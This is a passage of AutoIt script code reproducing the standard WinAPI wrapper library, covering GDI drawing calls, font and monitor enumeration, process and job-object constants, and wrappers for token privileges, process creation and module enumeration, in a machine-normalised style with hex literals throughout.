        Local $acall = DllCall("gdi32.dll", "bool", "StrokeAndFillPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StrokeAndFillPath

    Func _WinAPI_StrokePath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "StrokePath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StrokePath

    Func _WinAPI_SubtractRect(ByRef $trect1, ByRef $trect2)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "SubtractRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_SubtractRect

    Func _WinAPI_TabbedTextOut($hdc, $ix, $iy, $stext, $atab = 0x0, $ISTART = 0x0, $IEND = + -1, $iorigin = 0x0)
        Local $itab, $icount
        If Not IsArray($atab) Then
            If $atab Then
                $itab = $atab
                Dim $atab[0x1] = [$itab]
                $ISTART = 0x0
                $IEND = 0x0
                $icount = 0x1
            Else
                $icount = 0x0
            EndIf
        Else
            $icount = 0x1
        EndIf
        Local $ttab = 0x0
        If $icount Then
            If __CheckErrorArrayBounds($atab, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
            $icount = $IEND - $ISTART + 0x1
            $ttab = DllStructCreate("uint[" & $icount & "]")
            $itab = 0x1
            For $i = $ISTART To $IEND
                DllStructSetData($ttab, 0x1, $atab[$i], $itab)
                $itab += 0x1
            Next
        EndIf
        Local $acall = DllCall("user32.dll", "long", "TabbedTextOutW", "handle", $hdc, "int", $ix, "int", $iy, "wstr", $stext, "int", StringLen($stext), "int", $icount, "struct*", $ttab, "int", $iorigin)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        $__g_vext = _WinAPI_CreateSize(_WinAPI_LoWord($acall[0x0]), _WinAPI_HiWord($acall[0x0]))
        Return 0x1
    EndFunc    ; -> _WinAPI_TabbedTextOut

    Func _WinAPI_TextOut($hdc, $ix, $iy, $stext)
        Local $acall = DllCall("gdi32.dll", "bool", "TextOutW", "handle", $hdc, "int", $ix, "int", $iy, "wstr", $stext, "int", StringLen($stext))
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_TextOut

    Func _WinAPI_TransparentBlt($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $irgb)
        Local $acall = DllCall("gdi32.dll", "bool", "GdiTransparentBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", __rgb($irgb))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_TransparentBlt

    Func _WinAPI_UnionRect(ByRef $trect1, ByRef $trect2)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "UnionRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, 0x0, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_UnionRect

    Func _WinAPI_ValidateRect($hwnd, $trect = 0x0)
        Local $acall = DllCall("user32.dll", "bool", "ValidateRect", "hwnd", $hwnd, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ValidateRect

    Func _WinAPI_ValidateRgn($hwnd, $hrgn = 0x0)
        Local $acall = DllCall("user32.dll", "bool", "ValidateRgn", "hwnd", $hwnd, "handle", $hrgn)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ValidateRgn

    Func _WinAPI_WidenPath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "WidenPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WidenPath

    Func _WinAPI_WindowFromDC($hdc)
        Local $acall = DllCall("user32.dll", "hwnd", "WindowFromDC", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WindowFromDC

#EndRegion Public Functions
#Region Internal Functions
    Func __EnumDisplayMonitorsProc($hmonitor, $hdc, $PRECT, $lparam)
        #forceref $hDC, $lParam
        __Inc($__g_venum)
        $__g_venum[$__g_venum[0x0][0x0]][0x0] = $hmonitor
        If Not $PRECT Then
            $__g_venum[$__g_venum[0x0][0x0]][0x1] = 0x0
        Else
            $__g_venum[$__g_venum[0x0][0x0]][0x1] = DllStructCreate($TAGRECT)
            If Not _WinAPI_MoveMemory(DllStructGetPtr($__g_venum[$__g_venum[0x0][0x0]][0x1]), $PRECT, 0x10) Then Return 0x0
        EndIf
        Return 0x1
    EndFunc    ; -> __EnumDisplayMonitorsProc

    Func __EnumFontFamiliesProc($PELFEX, $PNTMEX, $IFONTTYPE, $PPATTERN)
        Local $telfex = DllStructCreate($TAGLOGFONT & ";wchar FullName[64];wchar Style[32];wchar Script[32]", $PELFEX)
        Local $tntmex = DllStructCreate($TAGNEWTEXTMETRICEX, $PNTMEX)
        Local $tpattern = DllStructCreate("uint;uint;ptr", $PPATTERN)
        If $IFONTTYPE And Not BitAND($IFONTTYPE, DllStructGetData($tpattern, 0x1)) Then
            Return 0x1
        EndIf
        If DllStructGetData($tpattern, 0x3) Then
            Local $acall = DllCall("shlwapi.dll", "bool", "PathMatchSpecW", "ptr", DllStructGetPtr($telfex, 0xe), "ptr", DllStructGetData($tpattern, 0x3))
            If Not @error Then
                If DllStructGetData($tpattern, 0x2) Then
                    If $acall[0x0] Then
                        Return 0x1
                    Else
                    EndIf
                Else
                    If $acall[0x0] Then
                    Else
                        Return 0x1
                    EndIf
                EndIf
            EndIf
        EndIf
        __Inc($__g_venum)
        $__g_venum[$__g_venum[0x0][0x0]][0x0] = DllStructGetData($telfex, 0xe)
        $__g_venum[$__g_venum[0x0][0x0]][0x1] = DllStructGetData($telfex, 0x10)
        $__g_venum[$__g_venum[0x0][0x0]][0x2] = DllStructGetData($telfex, 0xf)
        $__g_venum[$__g_venum[0x0][0x0]][0x3] = DllStructGetData($telfex, 0x11)
        $__g_venum[$__g_venum[0x0][0x0]][0x4] = $IFONTTYPE
        $__g_venum[$__g_venum[0x0][0x0]][0x5] = DllStructGetData($tntmex, 0x13)
        $__g_venum[$__g_venum[0x0][0x0]][0x6] = DllStructGetData($tntmex, 0x14)
        $__g_venum[$__g_venum[0x0][0x0]][0x7] = DllStructGetData($tntmex, 0x15)
        Return 0x1
    EndFunc    ; -> __EnumFontFamiliesProc

    Func __EnumFontStylesProc($PELFEX, $PNTMEX, $IFONTTYPE, $PFN)
        #forceref $iFontType
        Local $telfex = DllStructCreate($TAGLOGFONT & ";wchar FullName[64];wchar Style[32];wchar Script[32]", $PELFEX)
        Local $tntmex = DllStructCreate($TAGNEWTEXTMETRICEX, $PNTMEX)
        Local $tfn = DllStructCreate("dword;wchar[64]", $PFN)
        If BitAND(DllStructGetData($tntmex, "ntmFlags"), 0x61) = DllStructGetData($tfn, 0x1) Then
            DllStructSetData($tfn, 0x2, DllStructGetData($telfex, "FullName"))
            Return 0x0
        Else
            Return 0x1
        EndIf
    EndFunc    ; -> __EnumFontStylesProc

#EndRegion Internal Functions
Global Const $CREATE_BREAKAWAY_FROM_JOB = 0x1000000
Global Const $CREATE_DEFAULT_ERROR_MODE = 0x4000000
Global Const $CREATE_NEW_CONSOLE = 0x10
Global Const $CREATE_NEW_PROCESS_GROUP = 0x200
Global Const $CREATE_NO_WINDOW = 0x8000000
Global Const $CREATE_PROTECTED_PROCESS = 0x40000
Global Const $CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x2000000
Global Const $CREATE_SEPARATE_WOW_VDM = 0x800
Global Const $CREATE_SHARED_WOW_VDM = 0x1000
Global Const $CREATE_SUSPENDED = 0x4
Global Const $CREATE_UNICODE_ENVIRONMENT = 0x400
Global Const $LIST_MODULES_32BIT = 0x1
Global Const $LIST_MODULES_64BIT = 0x2
Global Const $LIST_MODULES_ALL = 0x3
Global Const $LIST_MODULES_DEFAULT = 0x0
Global Const $ABOVE_NORMAL_PRIORITY_CLASS = 0x8000
Global Const $BELOW_NORMAL_PRIORITY_CLASS = 0x4000
Global Const $HIGH_PRIORITY_CLASS = 0x80
Global Const $IDLE_PRIORITY_CLASS = 0x40
Global Const $NORMAL_PRIORITY_CLASS = 0x20
Global Const $REALTIME_PRIORITY_CLASS = 0x100
Global Const $PROCESS_MODE_BACKGROUND_BEGIN = 0x100000
Global Const $PROCESS_MODE_BACKGROUND_END = 0x200000
Global Const $MUTEX_MODIFY_STATE = 0x1
Global Const $MUTEX_ALL_ACCESS = 0x1f0001
Global Const $JOB_OBJECT_ASSIGN_PROCESS = 0x1
Global Const $JOB_OBJECT_QUERY = 0x4
Global Const $JOB_OBJECT_SET_ATTRIBUTES = 0x2
Global Const $JOB_OBJECT_SET_SECURITY_ATTRIBUTES = 0x10
Global Const $JOB_OBJECT_TERMINATE = 0x8
Global Const $JOB_OBJECT_ALL_ACCESS = 0x1f001f
Global Const $JOB_OBJECT_LIMIT_ACTIVE_PROCESS = 0x8
Global Const $JOB_OBJECT_LIMIT_AFFINITY = 0x10
Global Const $JOB_OBJECT_LIMIT_BREAKAWAY_OK = 0x800
Global Const $JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION = 0x400
Global Const $JOB_OBJECT_LIMIT_JOB_MEMORY = 0x200
Global Const $JOB_OBJECT_LIMIT_JOB_TIME = 0x4
Global Const $JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x2000
Global Const $JOB_OBJECT_LIMIT_PRESERVE_JOB_TIME = 0x40
Global Const $JOB_OBJECT_LIMIT_PRIORITY_CLASS = 0x20
Global Const $JOB_OBJECT_LIMIT_PROCESS_MEMORY = 0x100
Global Const $JOB_OBJECT_LIMIT_PROCESS_TIME = 0x2
Global Const $JOB_OBJECT_LIMIT_SCHEDULING_CLASS = 0x80
Global Const $JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK = 0x1000
Global Const $JOB_OBJECT_LIMIT_WORKINGSET = 0x1
Global Const $JOB_OBJECT_UILIMIT_DESKTOP = 0x40
Global Const $JOB_OBJECT_UILIMIT_DISPLAYSETTINGS = 0x10
Global Const $JOB_OBJECT_UILIMIT_EXITWINDOWS = 0x80
Global Const $JOB_OBJECT_UILIMIT_GLOBALATOMS = 0x20
Global Const $JOB_OBJECT_UILIMIT_HANDLES = 0x1
Global Const $JOB_OBJECT_UILIMIT_READCLIPBOARD = 0x2
Global Const $JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS = 0x8
Global Const $JOB_OBJECT_UILIMIT_WRITECLIPBOARD = 0x4
Global Const $JOB_OBJECT_SECURITY_FILTER_TOKENS = 0x8
Global Const $JOB_OBJECT_SECURITY_NO_ADMIN = 0x1
Global Const $JOB_OBJECT_SECURITY_ONLY_TOKEN = 0x4
Global Const $JOB_OBJECT_SECURITY_RESTRICTED_TOKEN = 0x2
Global Const $JOB_OBJECT_TERMINATE_AT_END_OF_JOB = 0x0
Global Const $JOB_OBJECT_POST_AT_END_OF_JOB = 0x1
Global Const $SEMAPHORE_MODIFY_STATE = 0x2
Global Const $SEMAPHORE_QUERY_STATE = 0x1
Global Const $SEMAPHORE_ALL_ACCESS = 0x1f0003
Global Const $ES_AWAYMODE_REQUIRED = 0x40
Global Const $ES_CONTINUOUS = -2147483648
Global Const $ES_DISPLAY_REQUIRED = 0x2
Global Const $ES_SYSTEM_REQUIRED = 0x1
Global Const $ES_USER_PRESENT = 0x4
#Region Global Variables and Constants
    Global Const $TAGIO_COUNTERS = "struct;uint64 ReadOperationCount;uint64 WriteOperationCount;uint64 OtherOperationCount;uint64 ReadTransferCount;uint64 WriteTransferCount;uint64 OtherTransferCo" & _
        "unt;endstruct"
    Global Const $TAGJOBOBJECT_ASSOCIATE_COMPLETION_PORT = "ulong_ptr CompletionKey;ptr CompletionPort"
    Global Const $TAGJOBOBJECT_BASIC_ACCOUNTING_INFORMATION = "struct;int64 TotalUserTime;int64 TotalKernelTime;int64 ThisPeriodTotalUserTime;int64 ThisPeriodTotalKernelTime;dword TotalPageFaultCount;dword TotalProcesses;dw" & _
        "ord ActiveProcesses;dword TotalTerminatedProcesses;endstruct"
    Global Const $TAGJOBOBJECT_BASIC_AND_IO_ACCOUNTING_INFORMATION = $TAGJOBOBJECT_BASIC_ACCOUNTING_INFORMATION & ";" & $TAGIO_COUNTERS
    Global Const $TAGJOBOBJECT_BASIC_LIMIT_INFORMATION = "struct;int64 PerProcessUserTimeLimit;int64 PerJobUserTimeLimit;dword LimitFlags;ulong_ptr MinimumWorkingSetSize;ulong_ptr MaximumWorkingSetSize;dword ActiveProc" & _
        "essLimit;ulong_ptr Affinity;dword PriorityClass;dword SchedulingClass;endstruct"
    Global Const $TAGJOBOBJECT_BASIC_PROCESS_ID_LIST = "dword NumberOfAssignedProcesses;dword NumberOfProcessIdsInList"
    Global Const $TAGJOBOBJECT_BASIC_UI_RESTRICTIONS = "dword UIRestrictionsClass"
    Global Const $TAGJOBOBJECT_END_OF_JOB_TIME_INFORMATION = "dword EndOfJobTimeAction"
    Global Const $TAGJOBOBJECT_EXTENDED_LIMIT_INFORMATION = $TAGJOBOBJECT_BASIC_LIMIT_INFORMATION & ";" & $TAGIO_COUNTERS & ";ulong_ptr ProcessMemoryLimit;ulong_ptr JobMemoryLimit;ulong_ptr PeakProcessMemoryUsed;ulong_ptr PeakJobMemoryUsed"
    Global Const $TAGJOBOBJECT_GROUP_INFORMATION = ''
    Global Const $TAGJOBOBJECT_SECURITY_LIMIT_INFORMATION = "dword SecurityLimitFlags;ptr JobToken;ptr SidsToDisable;ptr PrivilegesToDelete;ptr RestrictedSids"
    Global Const $TAGMODULEINFO = "ptr BaseOfDll;dword SizeOfImage;ptr EntryPoint"
    Global Const $TAGPROCESSENTRY32 = "dword Size;dword Usage;dword ProcessID;ulong_ptr DefaultHeapID;dword ModuleID;dword Threads;dword ParentProcessID;long PriClassBase;dword Flags;wchar ExeFile[26" & _
        "0]"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_AdjustTokenPrivileges($htoken, $aprivileges, $iattributes, ByRef $aadjust)
        $aadjust = 0x0
        If Not $aprivileges And IsNumber($aprivileges) Then Return 0x0
        Local $ttp1 = 0x0, $ttp2, $icount, $acall, $bdisable = False
        If $aprivileges = + -1 Then
            $ttp2 = DllStructCreate("dword")
            $acall = DllCall("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $htoken, "bool", 0x1, "ptr", 0x0, "dword", 0x0, "struct*", $ttp2, "dword*", 0x0)
            If @error Then Return SetError(@error, @extended, 0x0)
            Local $ilasterror = _WinAPI_GetLastError()
            Switch $ilasterror
            Case 0x7a
                $ttp2 = DllStructCreate("dword;dword[" & ($acall[0x6] / 0x4 + -1) & "]")
                If @error Then
                    ContinueCase
                EndIf
            Case Else
                Return SetError(0xa, $ilasterror, 0x0)
            EndSwitch
            $bdisable = True
        Else
            Local $aprev = 0x0
            If Not IsArray($aprivileges) Then
                Dim $aprev[0x1][0x2]
                $aprev[0x0][0x0] = $aprivileges
                $aprev[0x0][0x1] = $iattributes
            Else
                If Not UBound($aprivileges, $UBOUND_COLUMNS) Then
                    $icount = UBound($aprivileges)
                    Dim $aprev[$icount][0x2]
                    For $i = 0x0 To $icount + -1
                        $aprev[$i][0x0] = $aprivileges[$i]
                        $aprev[$i][0x1] = $iattributes
                    Next
                EndIf
            EndIf
            If IsArray($aprev) Then
                $aprivileges = $aprev
            EndIf
            Local $tagstruct = "dword;dword[" & (0x3 * UBound($aprivileges)) & "]"
            $ttp1 = DllStructCreate($tagstruct)
            $ttp2 = DllStructCreate($tagstruct)
            If @error Then Return SetError(@error + 0x14, 0x0, 0x0)
            DllStructSetData($ttp1, 0x1, UBound($aprivileges))
            For $i = 0x0 To UBound($aprivileges) + -1
                DllStructSetData($ttp1, 0x2, $aprivileges[$i][0x1], 0x3 * $i + 0x3)
                $acall = DllCall("advapi32.dll", "bool", "LookupPrivilegeValueW", "ptr", 0x0, "wstr", $aprivileges[$i][0x0], "ptr", DllStructGetPtr($ttp1, 0x2) + 0xc * $i)
                If @error Or Not $acall[0x0] Then Return SetError(@error + 0x64, @extended, 0x0)
            Next
        EndIf
        $acall = DllCall("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $htoken, "bool", $bdisable, "struct*", $ttp1, "dword", DllStructGetSize($ttp2), "struct*", $ttp2, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xc8, @extended, 0x0)
        Local $iresult
        Switch _WinAPI_GetLastError()
        Case 0x514
            $iresult = 0x1
        Case Else
            $iresult = 0x0
        EndSwitch
        $icount = DllStructGetData($ttp2, 0x1)
        If $icount Then
            Local $tdata = DllStructCreate("wchar[128]")
            Dim $aprivileges[$icount][0x2]
            For $i = 0x0 To $icount + -1
                $acall = DllCall("advapi32.dll", "bool", "LookupPrivilegeNameW", "ptr", 0x0, "ptr", DllStructGetPtr($ttp2, 0x2) + 0xc * $i, "struct*", $tdata, "dword*", 0x80)
                If @error Or Not $acall[0x0] Then Return SetError(@error + 0x12c, @extended, 0x0)
                $aprivileges[$i][0x1] = DllStructGetData($ttp2, 0x2, 0x3 * $i + 0x3)
                $aprivileges[$i][0x0] = DllStructGetData($tdata, 0x1)
            Next
            $aadjust = $aprivileges
        EndIf
        Return SetExtended($iresult, 0x1)
    EndFunc    ; -> _WinAPI_AdjustTokenPrivileges

    Func _WinAPI_AssignProcessToJobObject($hjob, $hprocess)
        Local $acall = DllCall("kernel32.dll", "bool", "AssignProcessToJobObject", "handle", $hjob, "handle", $hprocess)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AssignProcessToJobObject

    Func _WinAPI_AttachConsole($ipid = + -1)
        Local $acall = DllCall("kernel32.dll", "bool", "AttachConsole", "dword", $ipid)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AttachConsole

    Func _WinAPI_AttachThreadInput($iattach, $iattachto, $battach)
        Local $acall = DllCall("user32.dll", "bool", "AttachThreadInput", "dword", $iattach, "dword", $iattachto, "bool", $battach)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AttachThreadInput

    Func _WinAPI_CreateEvent($tattributes = 0x0, $bmanualreset = True, $binitialstate = True, $sname = '')
        If $sname = '' Then $sname = Null
        Local $acall = DllCall("kernel32.dll", "handle", "CreateEventW", "struct*", $tattributes, "bool", $bmanualreset, "bool", $binitialstate, "wstr", $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $ilasterror = _WinAPI_GetLastError()
        If $ilasterror Then Return SetExtended($ilasterror, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateEvent

    Func _WinAPI_CreateJobObject($sname = '', $tsecurity = 0x0)
        If Not StringStripWS($sname, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sname = Null
        Local $acall = DllCall("kernel32.dll", "handle", "CreateJobObjectW", "struct*", $tsecurity, "wstr", $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateJobObject

    Func _WinAPI_CreateMutex($smutex, $binitial = True, $tsecurity = 0x0)
        Local $acall = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $tsecurity, "bool", $binitial, "wstr", $smutex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateMutex

    Func _WinAPI_CreateProcess($sappname, $scommand, $tsecurity, $tthread, $binherit, $iflags, $penviron, $sdir, $tstartupinfo, $tprocess)
        Local $tcommand = 0x0
        If $sappname = '' Then $sappname = Null
        If $scommand <> '' Then
            $tcommand = DllStructCreate("wchar Text[" & 0x104 + 0x1 & "]")
            DllStructSetData($tcommand, "Text", $scommand)
        EndIf
        If $sdir = '' Then $sdir = Null
        Local $acall = DllCall("kernel32.dll", "bool", "CreateProcessW", "wstr", $sappname, "struct*", $tcommand, "struct*", $tsecurity, "struct*", $tthread, "bool", $binherit, "dword", $iflags, "struct*", $penviron, "wstr", $sdir, "struct*", $tstartupinfo, "struct*", $tprocess)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateProcess

    Func _WinAPI_CreateProcessWithToken($sapp, $scmd, $iflags, $tstartupinfo, $tprocessinfo, $htoken, $ilogon = 0x0, $penvironment = 0x0, $sdir = '')
        If Not StringStripWS($sapp, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sapp = Null
        If Not StringStripWS($scmd, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $scmd = Null
        If Not StringStripWS($sdir, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sdir = Null
        Local $acall = DllCall("advapi32.dll", "bool", "CreateProcessWithTokenW", "handle", $htoken, "dword", $ilogon, "wstr", $sapp, "wstr", $scmd, "dword", $iflags, "struct*", $penvironment, "wstr", $sdir, "struct*", $tstartupinfo, "struct*", $tprocessinfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateProcessWithToken

    Func _WinAPI_CreateSemaphore($ssemaphore, $iinitial, $imaximum, $tsecurity = 0x0)
        Local $acall = DllCall("kernel32.dll", "handle", "CreateSemaphoreW", "struct*", $tsecurity, "long", $iinitial, "long", $imaximum, "wstr", $ssemaphore)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateSemaphore

    Func _WinAPI_DuplicateTokenEx($htoken, $iaccess, $ilevel, $itype = 0x1, $tsecurity = 0x0)
        Local $acall = DllCall("advapi32.dll", "bool", "DuplicateTokenEx", "handle", $htoken, "dword", $iaccess, "struct*", $tsecurity, "int", $ilevel, "int", $itype, "handle*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x6]
    EndFunc    ; -> _WinAPI_DuplicateTokenEx

    Func _WinAPI_EmptyWorkingSet($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x500  : 0x1100), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EmptyWorkingSet", "handle", $hprocess[0x0])
        If __CheckErrorCloseHandle($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_EmptyWorkingSet

    Func _WinAPI_EnumChildProcess($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hsnapshot = DllCall("kernel32.dll", "handle", "CreateToolhelp32Snapshot", "dword", 0x2, "dword", 0x0)
        If @error Or ($hsnapshot[0x0] = Ptr(+ -1)) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tprocessentry32 = DllStructCreate($TAGPROCESSENTRY32)
        Local $aret[0x65][0x2] = [[0x0]]
        $hsnapshot = $hsnapshot[0x0]
        DllStructSetData($tprocessentry32, "Size", DllStructGetSize($tprocessentry32))
        Local $acall = DllCall("kernel32.dll", "bool", "Process32FirstW", "handle", $hsnapshot, "struct*", $tprocessentry32)
        Local $ierror = @error
        While (Not @error) And ($acall[0x0])
            If DllStructGetData($tprocessentry32, "ParentProcessID") = $ipid Then
                __Inc($aret)
                $aret[$aret[0x0][0x0]][0x0] = DllStructGetData($tprocessentry32, "ProcessID")
                $aret[$aret[0x0][0x0]][0x1] = DllStructGetData($tprocessentry32, "ExeFile")
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "Process32NextW", "handle", $hsnapshot, "struct*", $tprocessentry32)
            $ierror = @error
        WEnd
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hsnapshot)
        If Not $aret[0x0][0x0] Then Return SetError($ierror + 0x14, 0x0, 0x0)
        __Inc($aret, + -1)
        Return $aret
    EndFunc    ; -> _WinAPI_EnumChildProcess

    Func _WinAPI_EnumDeviceDrivers()
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumDeviceDrivers", "ptr", 0x0, "dword", 0x0, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $isize
        If @AutoItX64 Then
            $isize = $acall[0x3] / 0x8
        Else
            $isize = $acall[0x3] / 0x4
        EndIf
        Local $tdata = DllStructCreate("ptr[" & $isize & "]")
        $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumDeviceDrivers", "struct*", $tdata, "dword", DllStructGetSize($tdata), "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $aret[$isize + 0x1] = [$isize]
        For $i = 0x1 To $isize
            $aret[$i] = DllStructGetData($tdata, 0x1, $i)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_EnumDeviceDrivers

    Func _WinAPI_EnumProcessHandles($ipid = 0x0, $itype = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $aret[0x65][0x4] = [[0x0]]
        Local $tagsystem_handle_table_entry_info = "ulong ProcessId;byte ObjectTypeNumber;byte Flags;ushort Handle;ptr Object;ulong GrantedAccess"
        Local $thandle = DllStructCreate($tagsystem_handle_table_entry_info)
        Local $ientrysize = DllStructGetSize($thandle)
        Local $imaxentries = 0x3ffff
        Local $tshi = DllStructCreate("ulong_ptr NumberOfHandles;byte Data[" & ($imaxentries + 0x1) * $ientrysize & "]")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQuerySystemInformation", "uint", 0x10, "struct*", $tshi, "ulong", DllStructGetSize($tshi), "ulong*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $pdata = DllStructGetPtr($tshi, "Data")
        Local $i, $inumberofhandles = DllStructGetData($tshi, "NumberOfHandles")
        For $i = 0x1 To $inumberofhandles
            If $i > $imaxentries Then ExitLoop
            $thandle = DllStructCreate($tagsystem_handle_table_entry_info, $pdata + ($i + -1) * $ientrysize)
            If (DllStructGetData($thandle, "ProcessId") = $ipid) And ((Not $itype) Or ($itype = DllStructGetData($thandle, "ObjectTypeNumber"))) Then
                __Inc($aret)
                $aret[$aret[0x0][0x0]][0x0] = Ptr(DllStructGetData($thandle, "Handle"))
                $aret[$aret[0x0][0x0]][0x1] = DllStructGetData($thandle, "ObjectTypeNumber")
                $aret[$aret[0x0][0x0]][0x2] = DllStructGetData($thandle, "Flags")
                $aret[$aret[0x0][0x0]][0x3] = DllStructGetData($thandle, "GrantedAccess")
            EndIf
        Next
        If Not $aret[0x0][0x0] Then Return SetError(0xb, 0x0, 0x0)
        __Inc($aret, + -1)
        If $i < $inumberofhandles Then Return SetExtended($inumberofhandles, $aret)
        Return $aret
    EndFunc    ; -> _WinAPI_EnumProcessHandles

    Func _WinAPI_EnumProcessModules($ipid = 0x0, $iflag = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x410  : 0x1010), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $icount, $acall, $ierror = 0x0
        Do
            If _WinAPI_GetVersion() >= 6 Then
                $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumProcessModulesEx", "handle", $hprocess[0x0], "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "dword", $iflag)
            Else
                $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumProcessModules", "handle", $hprocess[0x0], "ptr", 0x0, "dword", 0x0, "dword*", 0x0)
            EndIf
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
            If @AutoItX64 Then
                $icount = $acall[0x4] / 0x8
            Else
                $icount = $acall[0x4] / 0x4
            EndIf
            Local $tptr = DllStructCreate("ptr[" & $icount & "]")
            If @error Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            If _WinAPI_GetVersion() >= 6 Then
                $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumProcessModulesEx", "handle", $hprocess[0x0], "struct*", $tptr, "dword", DllStructGetSize($tptr), "dword*", 0x0, "dword", $iflag)
            Else
                $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumProcessModules", "handle", $hprocess[0x0], "struct*", $tptr, "dword", DllStructGetSize($tptr), "dword*", 0x0)
            EndIf
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x28
                ExitLoop
            EndIf
            Local $aret[$icount + 0x1][0x2] = [[$icount]]
            For $i = 0x1 To $icount
                $aret[$i][0x0] = DllStructGetData($tptr, 0x1, $i)
